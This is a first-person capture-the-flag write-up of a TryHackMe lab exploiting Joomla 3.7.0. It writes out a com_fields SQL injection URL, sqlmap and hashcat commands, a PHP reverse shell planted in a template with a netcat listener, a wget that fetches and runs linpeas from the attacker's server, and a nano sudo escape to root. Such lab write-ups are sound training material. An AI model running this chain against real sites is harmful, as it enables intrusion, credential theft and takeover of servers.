# Joomla version number : 3.7.0 Exploitation Write-up (Tryhackme Daily Bugle room )
## 1. Introduction
###
In this penetration testing challenge, I targeted a machine running Joomla 3.7.0 hosted at http://10.10.47.25. The goal was to exploit the system, gain administrative access, establish a reverse shell, and ultimately capture both the user and root flags through privilege escalation.

## 2. Initial Reconnaissance
###
I started with a basic Nmap scan to identify open ports and services:
nmap -sC -sV -oN nmap.txt 10.10.47.25

Results:

  Port 80: Apache HTTP server

  Joomla 3.7.0 CMS detected from page source

  ## 3. Exploitation Process
  ###
  ** 3.1 SQL Injection in Joomla 3.7.0 **

Joomla 3.7.0 contains a SQL injection vulnerability in the com_fields component due to improper input validation. I confirmed the vulnerability using a payload:

bash


http://10.10.47.25/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,(SELECT user())),0)

To automate the data extraction, I used sqlmap:

sqlmap -u "http://10.10.47.25/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" --dump



Extracted Data:

  Username: Jonah

  Password Hash: $2y$10$0veO/JSFh4389Lluc4Xya.df...





** 3.2 Cracking the Password Hash **




The bcrypt hash was cracked using Hashcat with the rockyou.txt wordlist:


hashcat -m 3200 hash.txt rockyou.txt

The password i got is : spiderman123






** 3.3 Joomla Admin Login and Reverse Shell Upload **







Using the credentials Jonah:spiderman123, I logged into the admin panel at:

http://10.10.47.25/administrator/


Inside the Templates > Beez3 > index.php, I replaced the code with a PHP reverse shell payload (from pentestmonkey) and changed the IP and port accordingly:

$ip = '10.13.83.247';  // Attacker IP
$port = 7777;          // Listening port


** 3.4 Reverse Shell Access **

Before executing the payload, I set up a listener on my machine:

nc -lvnp 7777

Then I accessed:

http://10.10.47.25/templates/beez3/index.php

Boom — I got a shell as www-data:

Linux target 4.x.x-xx-generic
uid=33(www-data) gid=33(www-data) groups=33(www-data)

## 4. Post Exploitation

** 4.1 Enumerating Users **

From the reverse shell, I checked /home/:

ls /home/

Found a user named jonah. I navigated to the home directory and found the user flag:

cat /home/jonah/user.txt

User Flag Acquired ✅
** 4.2 Privilege Escalation **

To escalate privileges, I uploaded LinPeas.sh to the target system by hosting it on a Python HTTP server:

# On my machine:
python3 -m http.server 9999

# On target (via reverse shell):
wget http://10.13.83.247:9999/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

** 4.3 Exploiting Sudo Rights **

LinPeas revealed that the user jonah had passwordless sudo access to /usr/bin/nano:

(ALL) NOPASSWD: /usr/bin/nano

To escalate, I ran:

sudo /usr/bin/nano

Then, within nano:

  Pressed Ctrl + R (read file)

  Then Ctrl + X (execute command)

  Typed:

  reset; sh 1>&0 2>&0

  This dropped me into a root shell!

** 4.4 Root Flag **

Once root access was obtained, I navigated to /root/ and grabbed the flag:

cat /root/root.txt

Root Flag Acquired ✅


## 5. Conclusion

This challenge involved a full exploitation chain:

   ✅ SQL Injection to extract credentials

   ✅ Cracking password hashes with Hashcat

   ✅ Joomla admin login and remote PHP shell upload

   ✅ Reverse shell access

   ✅ Post-exploitation enumeration with LinPeas

   ✅ Privilege escalation using sudo misconfigurations

   ✅ Extraction of both user and root flags

This exercise reinforced key web exploitation and Linux post-exploitation techniques commonly found in real-world scenarios.




  
